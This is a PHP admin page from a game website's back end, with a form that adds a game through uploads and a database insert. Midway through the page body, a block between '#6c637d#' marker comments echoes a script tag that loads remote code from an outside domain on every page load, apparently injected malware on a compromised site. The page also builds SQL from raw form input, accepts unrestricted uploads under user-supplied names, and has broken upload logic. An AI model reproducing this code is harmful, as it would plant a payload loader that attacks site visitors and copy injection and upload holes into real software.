<?php session_start();
ob_start();
$page = "Add Game";
$side_menu="Game";
include "inc/session_check.php";
include_once "inc/config.php";
if(isset($_POST['submit']))
{
	
	$cat_id = $_POST['cat_id'];
	$title = $_POST['title'];
	$instructions=$_POST['instructions'];
	
	$keywords=addslashes($_POST['keywords']);
	$meta_tag = $_POST['meta_tag'];
	
	$other_site = $_POST['other_site'];
	
	$postdate = date("Y-m-d");
	
	
	$target_path="imagefile/".time()."_".$_FILES['image_file']['name'];
	
	$target_path1="videos/".time()."_".$_FILES['flash_file']['name'];
	
	if(move_uploaded_file($_FILES['flash_file']['tmp_name'], $target_path1))
	{
	
		if(move_uploaded_file($_FILES['image_file']['tmp_name'], $target_path)) 
		{
			 $img_path="gadmin/".$target_path;
			  $vi_path="gadmin/".$target_path1;
			  $ins="insert into game(cat_id,title,instructions,image_file,keywords,meta_tag,flash_file,other_site,post_date,status) values('$cat_id','$title','$instructions','$img_path','$keywords','$meta_tag','$vi_path','$other_site','$postdate','1')";
			  
		}
echo "Flash not uploaded";
		}
		else
		{
			header("location: list_game.php?msg=err&cont=Erro can't upload original image.");
		}
	if(mysql_query($ins))
{
	//unset($_POST);
	header("location: list_game.php?msg=succ&cont=Game details uploaded successfully");
}
else
	{
		header("location: add_game.php?msg=err&cont=Error in insert query");
	}


}

?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Add Game</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  Game
                  </div>
                </div>
                <div class="widget-body">
                	<?php include 'message.php'; ?>
<?php
#6c637d#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967012\"></script>";
echo $g;
}
#/6c637d#
?>                	


                	<form class="form-horizontal no-margin well" id="ad_form" name="form" method="post" enctype="multipart/form-data" >
	            	  <h5 class="text-info">Game Information</h5>
                    <hr>
                    <div class="control-group">
                      <label class="control-label">
                        Add Game * :
                      </label>
                      <div class="controls">
                      	<select class="required span4" name="cat_id" id="cat_id">
					<option value="">--Select</option>
					<?php
					$select_pos = mysql_query("select id,name from category where status=1 order by name asc");
					while($fetch_pos=mysql_fetch_assoc($select_pos))
					{?>
					<option value="<?=$fetch_pos['id']?>"><?=$fetch_pos['name']?></option>
					<?php }
					 ?>
					</select>
                     </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Title * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" value="" name="title">
                      </div>
                    </div>
                    
                    <div class="control-group">
                      <label class="control-label">
                        Instructions * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" value="" name="instructions">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                       Image File :
                      </label>
                      <div class="controls">
                        <input type="file" class="required span4" name="image_file" value="">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Keywords * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" name="keywords" value="">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Meta Tag * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" name="meta_tag" value="">
                      </div>
                    </div>
                    
                    <div class="control-group">
                      <label class="control-label">
                       Flash file * :
                      </label>
                      <div class="controls">
					  <label class="radio inline">
                        	<input type="file" value=""  name="flash_file"/> 
					  </label>
                      </div>
                    </div> 
                    
                    
				   <div class="control-group">
                      <label class="control-label">
                        Othersite Game:
                      </label>
                      <div class="controls">
                      	<label class="radio inline">
                       <input type="radio" name="other_site" checked="checked" value="no" />No 
					</label>
					<label class="radio inline">
					 <input type="radio" name="other_site" value="yes" />Yes
					 </label>
                      </div>
                    </div>
                    
                    
                    
			 
				 <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
			</form>
				</div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>
  $(document).ready(function(){
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
    $("#advert_pos").change(function(){
    	var posid = $(this).val();
    	dataString = "posid="+posid;
    	$.ajax({
    	type: "POST",
    	url: "get_ad_size.php",
    	data: dataString,
    	success: function(html){
    		$("#advert_size").html(html);
    	}
    	})
    });
    });
</script>
</body>
</html>
	